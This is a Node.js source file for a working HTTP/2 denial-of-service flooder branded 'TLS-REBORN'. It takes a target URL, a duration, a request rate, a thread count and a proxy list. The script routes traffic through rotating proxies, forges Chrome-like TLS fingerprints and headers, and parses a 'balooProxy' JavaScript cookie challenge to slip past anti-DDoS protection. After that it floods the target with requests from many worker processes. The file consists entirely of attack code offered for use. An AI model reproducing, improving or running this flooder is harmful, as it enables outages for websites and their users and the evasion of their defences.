-process.on('uncaughtException', function(er) {
    console.log(er);
});
process.on('unhandledRejection', function(er) {
    console.log(er);
});

process.on("SIGHUP", () => {
    process.exit(0);

  })
process.on("SIGCHILD", () => {
    process.exit(0);

  });
  

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
const fs = require("fs")
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");

const net = require("net");
const tls = require("tls");
const url = require("url");
const scp = require("set-cookie-parser");
const CryptoJS = require("crypto-js");
require('colors')

function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
      s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
  }

var path = require("path");
var fileName = __filename;
var file = path.basename(fileName);

if (process.argv.length < 6){
    console.log('node ' + file + ' <url> <time> <requests> <threads> ( options: <cookie> )'); 
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
defaultCiphers[0],
defaultCiphers[2],
defaultCiphers[1],
defaultCiphers.slice(3) 
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

function _log(x) {
    console.log("["+"TLS-REBORN".red.bold+"] "+x)
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

// function readProxies() {
//     return fs.readFileSync("./reborn_proxies.txt").toString().split(/\r?\n/);
// }
 
let currentProxy = 0;

function getProxy() {
    if(!proxies[currentProxy+1]) {
        currentProxy = 0;
    }

    currentProxy++
    return proxies[currentProxy-1]
}

 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 

 function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}
 
const args = {
    target: process.argv[2],
    time: process.argv[3],
    rate: process.argv[4],
    threads: process.argv[5],
    proxy: process.argv[6],
    cookie: process.argv[7] || undefined
}

const { HeaderGenerator, PRESETS } = require('header-generator');

let proxies = readLines(args.proxy)
const parsedTarget = url.parse(args.target);

if (cluster.isMaster){
    const dateObj = new Date();
        for (let i = 0; i < process.argv[5]; i++){
            cluster.fork();
        }
        console.clear();
        _log(`Target: ${parsedTarget.host}`)
        _log(`Proxies: ${proxies.length}`)
        _log(`Time: ${process.argv[3]}`)
        _log(`Threads: ${args.threads}`);
        _log(`Rate: ${args.rate}`);
        setTimeout(() => {
        }, process.argv[5] * 1000);
        for (let counter = 1; counter <= args.threads; counter++) {cluster.fork();}}else {setInterval(runFlooder)}

class NetSocket {
     constructor(){}
 
HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
     host: options.host,
     port: options.port,
     allowHalfOpen: true,
     writable: true,
     readable: true
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 10000);
     connection.setNoDelay(true);
     connection.on("connect", () => {
     connection.write(buffer);
     });

     connection.on("data", chunk => {
     const response = chunk.toString("utf-8");
     const isAlive = response.includes("HTTP/1.1 200");
     if (isAlive === false) {
     connection.destroy();
     return callback(undefined, "403");
     }
     return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "403");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "403");
     });
}}

let headerGenerator = new HeaderGenerator({
        browsers: [
            {name: "chrome", minVersion: 87},
        ],
        devices: [
            "desktop"
        ],
        operatingSystems: [
            "windows"
        ]
});

function generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
        });
    return randomStringArray.join('');
}

const Socker = new NetSocket();

 function runFlooder() {
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"
    
    const headers = headerGenerator.getHeaders();
    headers[":method"] = "GET";
    headers[":path"] = parsedTarget.path;
    headers[":scheme"] = parsedTarget.protocol == "https:" ? "https" : "http";

     const proxyAddr = getProxy();
     const parsedProxy = proxyAddr.split(":");

     headers[":authority"] = parsedTarget.host

     const proxyOptions = {
        host: parsedProxy[0],
        port: parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15000
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
         connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true);

         const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

         const tlsOptions = {
            port: parsedPort,
            ALPNProtocols: [
                "h2"
            ],
            secure: true,
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            servername: url.hostname,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureOptions: secureOptions,
            secureContext: secureContext,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"]
        };

         const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 
         
         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 60 * 1000);
         tlsConn.setMaxListeners(0);
 
         const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });

         client.setMaxListeners(0);
         client.settings(settings);

         client.on("connect", () => {
            const IntervalAttack = (orgCookie) => {
                const _orgCookie = orgCookie || false;
                if(client.closed || client.destroyed) {
                    connection.destroy()
                    return
                }
                for (let i = 0; i < args.rate; i++) {
                    if(client.closed || client.destroyed) {
                        connection.destroy()
                        break
                    }
                    const request = client.request(headers)

                    .on("response", response => {
                        if(response['set-cookie']) {
                            headers["cookie"] = cookieString(scp.parse(response["set-cookie"]))
                        }

                        request.close();
                        request.destroy();
                        return
                    });

                    request.end();
                    
                    if(i+1 >= args.rate) {
                        if(!client.closed && !client.destroyed) {
                            Bypass(true, _orgCookie)
                            //setTimeout(IntervalAttack, 1000)
                        } else {
                            client.destroy();
                            connection.destroy()
                        }
                    }
                }
            }

            const Bypass = (reBypass, orgCookie) => {
                try {
                    let inspectData = false;
                    
                    if(client.closed || client.destroyed) {
                        client.destroy();
                        connection.destroy();
                        return;
                    }

                    //headers[":path"] = headers[":path"].replace("%RAND%", randomIntn(10000, 100000))
                    const request = client.request(headers)

                    request.on("response", response => {
                        if(response['set-cookie']) {
                            headers['cookie'] = cookieString(scp.parse(response["set-cookie"]))
                            orgCookie = headers['cookie']
                        }
                        //if(reBypass) {
                        //    //inspectData = true;
                        //}
                    });
                    request.on('error', error => {process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});
                        client.destroy();
                        connection.destroy();
                    })

                    let data = "";
                    //request.setEncoding('utf8');
                    request.on('data', (chunk) => {
                        data += chunk;
                    });

                    request.on('end', () => {
                        if(inspectData) {
                            console.log(data)
                        }
                        let attackSended = false;

                        //balooProxy bypass stage 2 (js)
                        if(data.includes("calcSolution") && data.includes('document.cookie')) {
                            let unpackCookie = data.split(`document.cookie="`)[1].split('"')[0];
                            
                            //orgCookie = stage 1 (cookie)
                            if(orgCookie) {
                                headers['cookie'] = orgCookie + "; "+unpackCookie
                            } else {
                                headers['cookie'] = unpackCookie
                            }

                            attackSended = true;
                            IntervalAttack(orgCookie)
                        }

                        if(!attackSended) {
                            IntervalAttack()
                        }


                        data = undefined
                        request.close();
                        request.destroy();
                    });

                    request.end();
                } catch(err) {
                    console.log(err)
                }
            }

            Bypass() 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
            client.destroy();
            connection.destroy();
         return
         });
     });
 }

const KillScript = () => process.exit();
setTimeout(KillScript, args.time * 1000);